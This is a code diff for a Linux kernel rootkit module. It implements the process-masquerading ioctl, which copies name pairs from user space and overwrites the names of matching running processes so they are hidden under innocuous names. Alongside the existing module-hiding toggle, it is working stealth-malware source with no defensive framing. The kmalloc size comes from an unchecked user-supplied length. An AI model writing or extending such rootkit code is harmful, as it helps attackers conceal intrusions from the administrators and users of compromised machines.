@@ -49,6 +49,24 @@ static void toggle_module_visibility(void) {
     is_hidden = !is_hidden;
 }
 
+static void masquerade_proc(struct masq_proc *proc) {
+    struct task_struct *task;
+    char *new_name = proc->new_name;
+    char *orig_name = proc->orig_name;
+
+    // new name must be shorter than original name
+    if (strnlen(new_name, MASQ_LEN) >= strnlen(orig_name, MASQ_LEN)) {
+        return;
+    }
+
+    // iterate over all processes and masquerade name if possible
+    for_each_process(task) {
+        if (strcmp(task->comm, orig_name) == 0) {
+            strcpy(task->comm, new_name);
+        }
+    }
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                           unsigned long arg) {
     long ret = 0;
@@ -60,7 +78,35 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         toggle_module_visibility();
         break;
     case IOCTL_MOD_MASQ:
-        // do something
+        struct masq_proc_req req;
+        struct masq_proc *procs;
+
+        // copy request from user space
+        if (copy_from_user(&req, (void *)arg, sizeof(req))) {
+            ret = -EFAULT;
+            break;
+        }
+
+        // allocate memory for procs
+        procs = kmalloc(req.len * sizeof(struct masq_proc), GFP_KERNEL);
+        if (!procs) {
+            ret = -ENOMEM;
+            break;
+        }
+
+        // copy procs from user space
+        if (copy_from_user(procs, req.list, req.len * sizeof(struct masq_proc))) {
+            kfree(procs);
+            ret = -EFAULT;
+            break;
+        }
+
+        // masquerade each process
+        for (int i = 0; i < req.len; i++) {
+            masquerade_proc(&procs[i]);
+        }
+
+        kfree(procs);
         break;
     case IOCTL_ADD_FILTER:
         // do something
